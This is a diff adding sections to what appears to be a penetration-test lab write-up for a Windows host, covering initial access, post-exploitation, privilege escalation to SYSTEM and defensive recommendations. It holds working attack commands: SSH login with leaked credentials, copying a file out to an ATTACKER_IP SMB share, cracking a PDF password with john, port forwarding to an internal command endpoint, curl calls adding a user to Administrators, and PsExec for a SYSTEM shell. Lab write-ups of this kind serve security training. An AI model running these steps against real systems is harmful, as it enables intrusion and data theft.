@@ -117,22 +117,133 @@ ariah : NowiseSloopTheory139
 
 ## 6. Initial Access
 
+Using the exposed credentials, SSH access was obtained:
+
+```
+ssh ariah@192.168.207.99
+```
+
+This resulted in unprivileged access.
+
 ---
 
 ## 7. Post-Exploitation
+
+Manual enumeration and winPEAS deployment identified a *System* service listening locally on port 80.
+
+```
+netstat -ano
+```
+
+A password-protected PDF file was located:
+
+```
+C:\ftp\Infrastructure.pdf
+```
+
+The PDF file was exfiltrated via SMB on the attacker machine:
+
+```
+sudo python3 smbserver.py share . -smb2support -username user -password pass
+```
+
+And shared via SMB on the target machine:
+
+```
+net use M: \\ATTACKER_IP\share /user:user pass
+
+copy C:\ftp\Infrastructure.pdf M:\
+
+net use M: /delete
+```
+
+On the attacker machine, the password was brute forced with john:
+
+```
+pdf2john Infrastructure.pdf > hash.txt
+
+john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+```
+
+This revealed the PDF password `ariah4168` that exposed the temporary command endpoint:
+
+```
+http://nickel/?
+```
+
+Pairing this with the listening *System* service on port 80 suggested a remote command endpoint.
 
 ---
 
 ## 8. Privilege Escalation
 
+SSH Port Forwarding was performed to internal port 80:
+
+```
+ssh -f -N -L 127.0.0.1:8081:127.0.0.1:80 ariah@192.168.207.99
+```
+
+And remote command execution confirmed `nt authority\system` execution:
+
+```
+curl http://localhost:8081/?whoami
+```
+
+User *ariah* was added to local Administrators:
+
+```
+curl 'http://localhost:8081/?Add-LocalGroupMember%20-Group%20Administrators%20-Member%20ariah'
+```
+
+PsExec was uploaded with scp:
+
+```
+scp PsExec64.exe ariah@192.168.207.99:C:\Users\ariah\psexec.exe
+```
+
+And execution resulted in command execution as `nt authority\system`:
+
+```
+psexec.exe -accepteula -s cmd.exe
+```
+
+This resulted in *SYSTEM* shell access.
+
 ---
 
 ## 9. Proof of Compromise
+
+**User Flag**: *REDACTED*
+
+```
+type C:\Users\ariah\Desktop\local.txt
+```
+
+**Root Flag**: *REDACTED*
+
+```
+type C:\Users\Administrator\Desktop\proof.txt
+```
+
+This confirms full system compromise.
 
 ---
 
 ## 10. Findings & Recommendations
 
+1. **Exposed DevOps dashboard disclosed backend functionality and internal service routing:** Remove development dashboards from production environments, enforce authentication and access controls, and restrict internal service exposure through firewall segmentation.
+
+2. **Base64-encoded credentials exposed via web application responses enabled unauthorized SSH access:** Eliminate hardcoded or client-exposed credentials, implement secure secret management practices, and conduct regular code reviews to prevent credential leakage.
+
+3. **Internally bound SYSTEM-level API allowed arbitrary PowerShell command execution via SSH port forwarding:** Require strong authentication and input validation for internal APIs, restrict execution privileges, and ensure sensitive services are not accessible through user-controlled tunneling.
+
+4. **Weak password protection on sensitive infrastructure documentation allowed offline password cracking:** Enforce strong password policies, avoid storing critical infrastructure documentation locally in accessible directories, and implement file-level access controls.
+
+5. **Local administrative privileges granted through command injection enabled full system compromise:** Apply the principle of least privilege, monitor group membership changes, and restrict administrative modification capabilities to properly secured management interfaces.
+
 ---
 
 ## 11. Appendix
+
+Reference for Copying Files from Remote Windows to Local Linux -
+[https://duckwrites.medium.com/3-cool-ways-to-move-files-from-windows-to-kali-42973ec35279](https://duckwrites.medium.com/3-cool-ways-to-move-files-from-windows-to-kali-42973ec35279)
